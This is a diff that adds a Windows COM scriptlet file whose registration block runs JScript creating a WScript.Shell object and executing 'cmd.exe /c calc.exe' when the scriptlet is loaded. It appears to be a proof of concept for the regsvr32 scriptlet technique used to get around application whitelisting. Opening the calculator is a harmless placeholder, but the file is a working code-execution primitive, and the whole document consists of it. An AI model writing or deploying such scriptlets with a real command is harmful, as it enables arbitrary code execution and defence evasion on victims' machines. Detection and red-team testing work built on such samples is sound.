@@ -1,0 +1,15 @@
+<?XML version="1.0"?>
+<scriptlet>
+<registration
+    description="calc"
+    progid="calc"
+    version="1.00"
+    classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}">
+    
+    <script language="JScript">
+        <![CDATA[
+            var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c calc.exe");
+        ]]>
+    </script>
+</registration>
+</scriptlet>
